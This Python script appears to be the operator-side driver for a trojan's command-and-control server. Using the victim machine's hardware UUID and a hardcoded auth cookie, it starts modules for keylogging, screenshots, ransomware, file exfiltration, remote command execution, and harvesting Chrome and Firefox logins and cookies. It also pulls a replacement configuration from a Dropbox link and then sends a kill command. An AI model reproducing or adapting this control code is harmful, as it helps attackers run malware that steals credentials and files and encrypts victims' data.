import requests
import subprocess
from time import sleep

hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].split(' ')[0]
base_url = 'http://127.0.0.1:5000'
auth_cookie = {'auth': 'cheeseburger'}

# dropbox_keylogger
requests.post(base_url+'/command', cookies=auth_cookie, json={
    'hwid': hwid,
    'body': 'start DropboxKeylogger'
})
sleep(7)

# dropbox_screenshotter
requests.post(base_url+'/command', cookies=auth_cookie, json={
    'hwid': hwid,
    'body': 'start DropboxScreenshotter'
})
sleep(7)

# dropbox_ransomware
requests.post(base_url+'/command', cookies=auth_cookie, json={
    'hwid': hwid,
    'body': 'start DropboxRansomware'
})
sleep(7)

# dropbox_file_exfiltrator
requests.post(base_url+'/command', cookies=auth_cookie, json={
    'hwid': hwid,
    'body': 'start DropboxFileExfiltrator'
})
sleep(7)

# dropbox_file_enumerator
requests.post(base_url+'/command', cookies=auth_cookie, json={
    'hwid': hwid,
    'body': 'start DropboxFileEnumerator'
})
sleep(7)

# dropbox_cmd_executor
requests.post(base_url+'/command', cookies=auth_cookie, json={
    'hwid': hwid,
    'body': 'start DropboxCMDExecutor'
})
sleep(7)

# dropbox_chrome_login_harvester
requests.post(base_url+'/command', cookies=auth_cookie, json={
    'hwid': hwid,
    'body': 'start DropboxChromeLoginHarvester'
})
sleep(7)

# dropbox_chrome_cookie_harvester
requests.post(base_url+'/command', cookies=auth_cookie, json={
    'hwid': hwid,
    'body': 'start DropboxChromeCookieHarvester'
})
sleep(7)

# dropbox_firefox_cookie_harvester
requests.post(base_url+'/command', cookies=auth_cookie, json={
    'hwid': hwid,
    'body': 'start DropboxFirefoxCookieHarvester'
})
sleep(7)

# show configs /info
_r = requests.get(base_url+f'/info?hwid={hwid}', cookies=auth_cookie)
print(_r.text)

# update configs
_src_config = 'https://dl.dropboxusercontent.com/s/8wr0597c2znr9r9/configs.json?dl=0'
requests.post(base_url+'/command', cookies=auth_cookie, json={
    'hwid': hwid,
    'body': 'config '+_src_config
})
sleep(7)

# show configs again /info
_r = requests.get(base_url+f'/info?hwid={hwid}', cookies=auth_cookie)
print(_r.text)
sleep(7)

# kill trojan
requests.post(base_url+'/command', cookies=auth_cookie, json={
    'hwid': hwid,
    'body': 'die'
})


